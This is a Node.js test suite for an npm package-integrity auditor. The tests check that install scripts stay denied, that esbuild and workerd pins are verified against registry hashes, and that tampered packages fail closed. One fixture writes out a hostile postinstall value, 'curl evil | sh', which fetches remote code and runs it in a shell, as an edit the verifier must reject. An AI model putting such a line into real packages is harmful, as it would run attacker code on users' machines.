import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { validateProposal,verifyRegistryTarball,normalizeNpmView } from "../../scripts/audit-worker-package-integrity.mjs";

const proposal=JSON.parse(readFileSync(new URL("../../control/worker-local-adapter-trust.proposed.json",import.meta.url),"utf8"));
const name="esbuild",version="0.28.2";
const bytes=Buffer.from("synthetic-test-archive-bytes:NEVER_EXECUTED");
const sha512="sha512-"+createHash("sha512").update(bytes).digest("base64");
const sha1=createHash("sha1").update(bytes).digest("hex");
const script="node install.js";
const pin={name,version,role:"blocked_install_script_candidate"};
const metadata={name,version,dist:{integrity:sha512,shasum:sha1},
  scripts:{postinstall:script}};
const manifest={name,version,scripts:{postinstall:script}};
const archive={integrity:sha512,shasum:sha1};
test("Trust proposal denies all script execution, cloud creation and canonical DB mutation",()=>{
 assert.equal(validateProposal(proposal),true);
 assert.equal(proposal.installLifecycle.approvedBuildScripts.length,0);
 assert.equal(proposal.localRuntimeSandbox.runCloudflareCLI,false);
 assert.equal(proposal.cloudDeploymentAllowed,false);
 assert.equal(proposal.canonicalDatabaseAccessAllowed,false);
 assert.deepEqual(proposal.installLifecycle.reviewOnlyCandidates.map(x=>x.name).sort(),["esbuild","workerd"]);
});
test("Matching official-registry SHA512/SHA1 and tarball manifest are evidence only, never script approval",()=>{
 const a=verifyRegistryTarball(pin,metadata,archive,manifest,bytes);
 assert.equal(a.registryArchiveIntegrityVerified,true);
 assert.deepEqual(a.lifecycleScriptNames,["postinstall"]);
 assert.equal(a.lifecycleScriptsExecuted,false);
 assert.equal(a.lifecycleApproval,"DENIED_PENDING_INDEPENDENT_REVIEW");
 assert.equal(a.nativeBinaryIndependentlyVerified,false);
});
test("npm view multi-field dotted dist path normalizes only explicit registry hashes",()=>{
 const dotted={name,version,"dist.integrity":sha512,"dist.shasum":sha1,scripts:{postinstall:script}};
 const normalized=normalizeNpmView(dotted);
 assert.equal(normalized.dist.integrity,sha512);
 assert.equal(normalized.dist.shasum,sha1);
 assert.equal(verifyRegistryTarball(pin,normalized,archive,manifest,bytes).registryArchiveIntegrityVerified,true);
 const empty=normalizeNpmView({name,version});
 assert.throws(()=>verifyRegistryTarball(pin,empty,archive,manifest,bytes),/TRUST_NO_REGISTRY_SHA512/);
 assert.throws(()=>normalizeNpmView(null),/TRUST_METADATA_SHAPE_INVALID/);
});
test("Tampering or false registry SRI is fail-closed",()=>{
 assert.throws(()=>verifyRegistryTarball(pin,metadata,archive,manifest,Buffer.concat([bytes,Buffer.from("evil")])),/TRUST_SRI_MISMATCH/);
 assert.throws(()=>verifyRegistryTarball(pin,{...metadata,dist:{...metadata.dist,integrity:"sha256-fake"}},archive,manifest,bytes),/TRUST_NO_REGISTRY_SHA512/);
 assert.throws(()=>verifyRegistryTarball(pin,metadata,{...archive,integrity:"sha512-invalid"},manifest,bytes),/TRUST_SRI_MISMATCH/);
});
test("A different tarball identity or edited install script cannot inherit trust",()=>{
 assert.throws(()=>verifyRegistryTarball(pin,metadata,archive,{...manifest,version:"0.28.3"},bytes),/TRUST_PACKAGE_IDENTITY_MISMATCH/);
 assert.throws(()=>verifyRegistryTarball(pin,metadata,archive,{...manifest,scripts:{postinstall:"curl evil | sh"}},bytes),/TRUST_LIFECYCLE_METADATA_MISMATCH/);
 assert.throws(()=>verifyRegistryTarball(pin,{...metadata,name:"not-esbuild"},archive,manifest,bytes),/TRUST_PACKAGE_IDENTITY_MISMATCH/);
});
test("A new or changed lifecycle permission is never silently accepted",()=>{
 assert.throws(()=>validateProposal({...proposal,installLifecycle:{...proposal.installLifecycle,approvedBuildScripts:["esbuild"]}}),/TRUST_PROPOSAL_MUST_DENY/);
 assert.throws(()=>validateProposal({...proposal,installLifecycle:{...proposal.installLifecycle,decision:"ALLOW"}}),/TRUST_PROPOSAL_MUST_DENY/);
 assert.throws(()=>validateProposal({...proposal,approvedForExecution:true}),/TRUST_PROPOSAL_MUST_DENY/);
 assert.throws(()=>validateProposal({...proposal,localRuntimeSandbox:{...proposal.localRuntimeSandbox,runCloudflareCLI:true}}),/TRUST_PROPOSAL_MUST_DENY/);
});
test("Pinned candidate set rejects missing or duplicate package identities",()=>{
 assert.throws(()=>validateProposal({...proposal,packageSources:proposal.packageSources.slice(0,6)}),/TRUST_PINS_INCOMPLETE/);
 const dup={...proposal,packageSources:[...proposal.packageSources.slice(0,6),proposal.packageSources[0]]};
 assert.throws(()=>validateProposal(dup),/TRUST_PINS_INVALID_OR_DUPLICATE/);
});
